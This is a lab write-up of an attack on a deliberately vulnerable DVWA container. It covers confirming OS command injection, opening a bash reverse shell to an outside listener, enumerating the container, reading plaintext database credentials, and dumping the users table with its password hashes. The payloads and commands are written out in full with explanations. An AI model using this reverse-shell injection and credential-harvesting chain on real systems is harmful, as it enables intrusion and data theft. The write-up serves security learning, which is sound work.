## Phase 1 — Recon: confirming the command injection vulnerability

The DVWA Command Injection module presents a simple form that asks for an IP
address and runs a `ping` against it. Before assuming this is exploitable,
the first step is confirming that user input is actually being passed
unsanitized to a shell command, rather than being validated as a real IP
address first.

First, a normal, expected input to establish a baseline:

```
127.0.0.1
```

<img width="655" height="496" alt="image" src="https://github.com/user-attachments/assets/e56b2ac2-550f-45ab-b048-893520ff5c7f" />

This returns the expected `ping` output for localhost — confirming the
backend really does execute a system `ping` command rather than, say, using a
built-in network library. Next, append a shell metacharacter to chain a
second, unrelated command onto the input:

```
127.0.0.1; whoami
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `127.0.0.1` | The expected, valid input — keeps the first command running normally so the page doesn't just error out |
| `;` | Shell command separator — on Linux, this terminates the first command and starts a new one, regardless of whether the first command succeeded |
| `whoami` | An arbitrary OS command with no relation to `ping` — if its output appears on the page, user input is being passed directly to a shell with no sanitization |

</details>

<img width="280" height="159" alt="image" src="https://github.com/user-attachments/assets/58cae92c-e6c6-4d71-9e9e-1f2f457f3752" />

If the page returns both the `ping` output **and** the result of `whoami`,
this confirms the vulnerability: the application is building a shell command
by directly concatenating user input, with no input validation or
sanitization at all. This is a classic OS Command Injection vulnerability
(CWE-78) — anything the web server's user account can run, an attacker can
now run too.

First, start a listener on Kali: 

```
nc -lvnp 4444
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `nc` | Netcat — used here to catch an incoming reverse shell connection |
| `-l` | Listen mode — waits for an incoming connection instead of initiating one |
| `-v` |Verbose — prints connection status |
| `-n` |Skips DNS resolution |
| `-p 4444	` |Listens on port 4444 |

</details>

Leave that running, then submit this payload into the DVWA ping field in your browser:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.50.10/4444 0>&1'
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `127.0.0.1;` | 	Same baseline input as before, chained with a second command |
| `bash -c '...'` | Runs the quoted string as a bash command |
| `bash -i` |Spawns an interactive bash shell |
| `>& /dev/tcp/10.0.50.10/4444` |Redirects both stdout and stderr into a TCP connection back to Kali on port 4444 — this is the actual reverse shell mechanism |
| `0>&1` |Redirects stdin from the same connection, so you can type commands into it |

</details>

<img width="328" height="74" alt="Screenshot 2026-11-01 101843" src="https://github.com/user-attachments/assets/7cf54349-d155-42e2-ab7b-6f5341900150" />

## Phase 3 — Enumeration for privilege escalation

With code execution established, the next step is looking for a way to
escalate beyond the low-privilege `www-data` account this shell is running
as. Rather than attempting a specific exploit blindly, enumeration starts
broad: check for sudo rights, readable files with embedded credentials, and
basic situational awareness of the box.

```
sudo -l
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `sudo -l` | Lists any commands the current user is allowed to run as another user (often root) via `sudo` — a common and very direct path to privilege escalation if misconfigured |

</details>

<details>
<summary>Click to view full output</summary>

```www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ sudo -l
sudo -l
bash: sudo: command not found
```

</details>

```
cat /var/www/html/config/config.inc.php
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `cat /var/www/html/config/config.inc.php` | DVWA's own database configuration file — commonly contains the database username/password in plaintext, which may be reused elsewhere on the network |

</details>

<details>
<summary>Click to view full output</summary>

```www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ cat /var/www/html/config/config.inc.php
<ities/exec$ cat /var/www/html/config/config.inc.php
<?php

# If you are having problems connecting to the MySQL database and all of the variables below are correct
# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
#   Thanks to @digininja for the fix.

# Database management system to use
$DBMS = getenv('DBMS') ?: 'MySQL';
#$DBMS = 'PGSQL'; // Currently disabled

# Database variables
#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
#   Please use a database dedicated to DVWA.
#
# If you are using MariaDB then you cannot use root, you must use create a dedicated DVWA user.
#   See README.md for more information on this.
$_DVWA = array();
$_DVWA[ 'db_server' ]   = getenv('DB_SERVER') ?: '127.0.0.1';
$_DVWA[ 'db_database' ] = getenv('DB_DATABASE') ?: 'dvwa';
$_DVWA[ 'db_user' ]     = getenv('DB_USER') ?: 'dvwa';
$_DVWA[ 'db_password' ] = getenv('DB_PASSWORD') ?: 'p@ssw0rd';
$_DVWA[ 'db_port']      = getenv('DB_PORT') ?: '3306';

# ReCAPTCHA settings
#   Used for the 'Insecure CAPTCHA' module
#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin
$_DVWA[ 'recaptcha_public_key' ]  = getenv('RECAPTCHA_PUBLIC_KEY') ?: '';
$_DVWA[ 'recaptcha_private_key' ] = getenv('RECAPTCHA_PRIVATE_KEY') ?: '';

# Default security level
#   Default value for the security level with each session.
#   The default is 'impossible'. You may wish to set this to either 'low', 'medium', 'high' or impossible'.
$_DVWA[ 'default_security_level' ] = getenv('DEFAULT_SECURITY_LEVEL') ?: 'impossible';

# Default locale
#   Default locale for the help page shown with each session.
#   The default is 'en'. You may wish to set this to either 'en' or 'zh'.
$_DVWA[ 'default_locale' ] = getenv('DEFAULT_LOCALE') ?: 'en';

# Disable authentication
#   Some tools don't like working with authentication and passing cookies around
#   so this setting lets you turn off authentication.
$_DVWA[ 'disable_authentication' ] = getenv('DISABLE_AUTHENTICATION') ?: false;

define ('MYSQL', 'mysql');
define ('SQLITE', 'sqlite');

# SQLi DB Backend
#   Use this to switch the backend database used in the SQLi and Blind SQLi labs.
#   This does not affect the backend for any other services, just these two labs.
#   If you do not understand what this means, do not change it.
$_DVWA['SQLI_DB'] = getenv('SQLI_DB') ?: MYSQL;
#$_DVWA['SQLI_DB'] = SQLITE;
#$_DVWA['SQLITE_DB'] = 'sqli.db';
```

</details>

```
find / -perm -4000 -type f 2>/dev/null
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `find / -perm -4000 -type f` | Searches the entire filesystem for files with the SUID bit set — programs that run with the file owner's privileges (often root) regardless of who executes them, a classic local privilege escalation vector |
| `2>/dev/null` | Suppresses permission-denied errors from directories this low-privilege user can't read |

</details>

<details>
<summary>Click to view full output</summary>

```?>www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ find / -perm -4000 -type f 2>/dev/null
<lities/exec$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
```

</details>

```
cat /etc/passwd
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `cat /etc/passwd` | Lists all local user accounts on the system — useful for understanding what accounts exist and which have real login shells vs. service accounts |

</details>

<details>
<summary>Click to view full output</summary>

```www-data@fe89249e8052:/var/www/html/vulnerabilities/exec$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

</details>

### Enumeration results

```
sudo -l
bash: sudo: command not found
```

No `sudo` available at all on this host — that avenue is closed.

```
cat /var/www/html/config/config.inc.php
```

This exposed DVWA's own database credentials directly in the config file:

| Setting | Value |
|---|---|
| `db_server` | `127.0.0.1` |
| `db_database` | `dvwa` |
| `db_user` | `dvwa` |
| `db_password` | `p@ssw0rd` |

Not a privilege escalation path on its own, but a real finding — plaintext
credentials in an application config file are a classic source of password
reuse elsewhere on a network.

```
find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
```

All standard system SUID binaries — nothing unusual or independently
exploitable here.

```
cat /etc/passwd
```

Only default system/service accounts present, no additional human user
accounts to target.

**Conclusion:** no local privilege escalation path exists inside this
specific container — a reasonably minimal image, consistent with realistic
hardening. Since this container's network identity sits behind
`vuln-docker-01`'s own Docker bridge rather than directly on the VULNERABLE
VLAN, the next step is checking for a container breakout path to the
underlying host itself.

The next useful check is whether this container has a path to break out to the host VM itself, which would actually be sitting on the VULNERABLE VLAN. Worth checking if the Docker socket is exposed inside the container — a very common misconfiguration that gives full host-level compromise:

```
ls -la /var/run/docker.sock
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `ls -la /var/run/docker.sock` |	Checks whether the Docker daemon’s control socket is mounted inside this container — if present and writable, it means this container can control the Docker host itself, including spinning up a new privileged container to escape into the host OS |

</details>

<details>
<summary>Click to view full output</summary>

```
<l/vulnerabilities/exec$ ls -la /var/run/docker.sock
ls: cannot access '/var/run/docker.sock': No such file or directory
```

</details>

Checking 2 more things:

```
ip a
```

```
env
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `ip a` |	Shows this container’s network interfaces and assigned IP addresses — reveals whether it’s isolated on a private Docker bridge or has broader network reach |
| `env` |	Lists all environment variables available to this process — since the DVWA config pulls values via getenv(), the real credentials in use (if different from the file’s defaults) would show up here |

</details>

<summary>Click to view full output</summary>

```
ip a
bash: ip: command not found
```

```
env
HOSTNAME=fe89249e8052
PHP_VERSION=8.5.11
APACHE_CONFDIR=/etc/apache2
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC 49D9AF6BC72A80D6691719C8AA23F5BE9C7097D4 D95C03BC702BE9515344AE3374E44BC9067701A5
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/var/www/html/vulnerabilities/exec
APACHE_LOG_DIR=/var/log/apache2
LANG=C
PHP_SHA256=d9be75c08e8c316f4c8f4194d8fbe1750a15f6a6d9d4e3fe72082abeeb800360
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
PHP_URL=https://www.php.net/distributions/php-8.5.11.tar.xz
APACHE_RUN_GROUP=www-data
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
APACHE_RUN_DIR=/var/run/apache2
APACHE_ENVVARS=/etc/apache2/envvars
DB_SERVER=db
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_ASC_URL=https://www.php.net/distributions/php-8.5.11.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=/usr/bin/env
```

</details>

`ip` isn’t installed in this minimal image, but the `env` output gave us something useful: `DB_SERVER=db` — the real database connection is going to a separate container named db (a Docker Compose service), not `127.0.0.1` as the config file’s fallback default suggested. That’s a lateral movement target inside the Docker bridge network.

Let’s find its IP without relying on the `ip` binary:

```
cat /etc/hosts
```

```
getent hosts db
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `cat /etc/hosts` |	Docker often auto-populates this file with container name-to-IP mappings for linked services |
| `getent hosts db` |	Resolves the hostname db via the system’s name resolution — works even if Docker uses internal DNS instead of /etc/hosts entries |

</details>

<summary>Click to view full output</summary>

```
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.19.0.3      fe89249e8052
```

```
getent hosts db
172.19.0.2      db
```

</details>

Good — `db` resolves to 172.19.0.2. Let’s check if a MySQL client is available to connect directly with the creds we found:

```
which mysql
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `which mysql` |	finds and displays the absolute path of the mysql executable in your current terminal environment |

</details>

No output for me. We can still connect using PHP itself, since this container already has mysqli installed (DVWA requires it) — the web server is effectively its own database client:

```
php -r '$c = new mysqli("172.19.0.2", "dvwa", "p@ssw0rd", "dvwa"); if ($c->connect_error) { die("Connection failed: " . $c->connect_error); } $r = $c->query("SHOW TABLES"); while ($row = $r->fetch_row()) { echo $row[0] . "\n"; }'
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `php -r '...'` |	Runs the quoted string as inline PHP code |
| `php -r '...'` |	Connects directly to the db container’s MySQL service using the credentials found in the config file, targeting the dvwa database |
| `php -r '...'` |	Lists every table in the database once connected |

</details>

<summary>Click to view full output</summary>

```
access_log
guestbook
security_log
users
```

</details>

Connected successfully. The users table is the interesting one — let’s pull it:

```
echo '<?php $c = new mysqli("172.19.0.2", "dvwa", "p@ssw0rd", "dvwa"); $r = $c->query("SELECT * FROM users"); while ($row = $r->fetch_assoc()) { print_r($row); }' > /tmp/dump.php
```

<details> <summary>Click to view full output</summary>

```
<>fetch_assoc()) { print_r($row); }' > /tmp/dump.php
```

</details>

```
php /tmp/dump.php
```

<details> <summary>Click to view full output</summary>

```
php /tmp/dump.php
Array
(
    [user_id] => 1
    [first_name] => admin
    [last_name] => admin
    [user] => admin
    [password] => 5f4dcc3b5aa765d61d8327deb882cf99
    [avatar] => /hackable/users/admin.jpg
    [last_login] => 2026-10-11 22:46:53
    [failed_login] => 0
    [role] => admin
    [account_enabled] => 1
)
Array
(
    [user_id] => 2
    [first_name] => Gordon
    [last_name] => Brown
    [user] => gordonb
    [password] => e99a18c428cb38d5f260853678922e03
    [avatar] => /hackable/users/gordonb.jpg
    [last_login] => 2026-10-11 22:46:53
    [failed_login] => 0
    [role] => user
    [account_enabled] => 1
)
Array
(
    [user_id] => 3
    [first_name] => Hack
    [last_name] => Me
    [user] => 1337
    [password] => 8d3533d75ae2c3966d7e0d4fcc69216b
    [avatar] => /hackable/users/1337.jpg
    [last_login] => 2026-10-11 22:46:53
    [failed_login] => 0
    [role] => user
    [account_enabled] => 1
)
Array
(
    [user_id] => 4
    [first_name] => Pablo
    [last_name] => Picasso
    [user] => pablo
    [password] => 0d107d09f5bbe40cade3de5c71e9e9b7
    [avatar] => /hackable/users/pablo.jpg
    [last_login] => 2026-10-11 22:46:53
    [failed_login] => 0
    [role] => user
    [account_enabled] => 1
)
Array
(
    [user_id] => 5
    [first_name] => Bob
    [last_name] => Smith
    [user] => smithy
    [password] => 5f4dcc3b5aa765d61d8327deb882cf99
    [avatar] => /hackable/users/smithy.jpg
    [last_login] => 2026-10-11 22:46:53
    [failed_login] => 0
    [role] => user
    [account_enabled] => 1
)
```

</details>

Confirmed exactly what we expected — straight DVWA default accounts, nothing more.

Further testing:

```
which curl wget
```

```
cat /proc/mounts
```

```
ps aux
```

<details> <summary>Command explained</summary>
  
| Part | What it does |
|---|---|
| `which curl wget` |	Checks whether this container can make outbound HTTP requests — if so, we could probe other services on the VULNERABLE VLAN host itself (e.g. Portainer, which manages Docker and would be a real path to host-level compromise if reachable and using weak/default creds) |
| `cat /proc/mounts` |	Lists all mounted filesystems inside the container — sometimes reveals host directories mounted in (a common real-world misconfiguration that enables container breakout) |
| `ps aux` |	Lists running processes — useful for spotting anything unexpected running alongside the web server |

</details>

<details> <summary>Click to view full output</summary>

```
/usr/bin/curl
```

```
overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/65/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/60/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/59/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/58/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/56/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/55/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/54/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/53/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/52/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/51/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/50/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/48/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/47/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/46/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/45/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/44/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/14/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/66/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/66/work,nouserxattr 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k,inode64 0 0
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hostname ext4 rw,relatime 0 0
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/hosts ext4 rw,relatime 0 0
/dev/mapper/ubuntu--vg-ubuntu--lv /etc/resolv.conf ext4 rw,relatime 0 0
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime,size=4k,nr_inodes=1,inode64 0 0
tmpfs /proc/interrupts tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/latency_stats tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/scsi tmpfs ro,relatime,size=4k,nr_inodes=1,inode64 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /sys/firmware tmpfs ro,relatime,size=4k,nr_inodes=1,inode64 0 0
```

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  1.0 196804 30772 ?        Ss   Oct31   0:02 apache2 -DFOREGROUND
www-data      17  0.0  0.3 197068 11488 ?        S    Oct31   0:00 apache2 -DFOREGROUND
www-data      18  0.0  0.6 197068 20120 ?        S    Oct31   0:00 apache2 -DFOREGROUND
www-data      19  0.0  0.6 197068 18432 ?        S    Oct31   0:00 apache2 -DFOREGROUND
www-data      20  0.0  0.6 197084 19380 ?        S    Oct31   0:00 apache2 -DFOREGROUND
www-data      21  0.0  0.6 197084 18848 ?        S    Oct31   0:00 apache2 -DFOREGROUND
www-data      22  0.0  0.5 197068 18124 ?        S    18:08   0:00 apache2 -DFOREGROUND
www-data      23  0.0  0.3 196860 10516 ?        S    18:08   0:00 apache2 -DFOREGROUND
www-data      24  0.0  0.5 197068 17768 ?        S    18:08   0:00 apache2 -DFOREGROUND
www-data      25  0.0  0.6 197084 19352 ?        S    18:08   0:00 apache2 -DFOREGROUND
www-data      31  0.0  0.0   2672  1740 ?        S    18:17   0:00 sh -c -- ping  -c 4 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.50.10/4444 0>&1'
www-data      33  0.0  0.1   4056  3124 ?        S    18:17   0:00 bash -c bash -i >& /dev/tcp/10.0.50.10/4444 0>&1
www-data      34  0.0  0.1   4320  3672 ?        S    18:17   0:00 bash -i
www-data      53  0.0  0.1   6392  3672 ?        R    19:16   0:00 ps aux
```

</details>
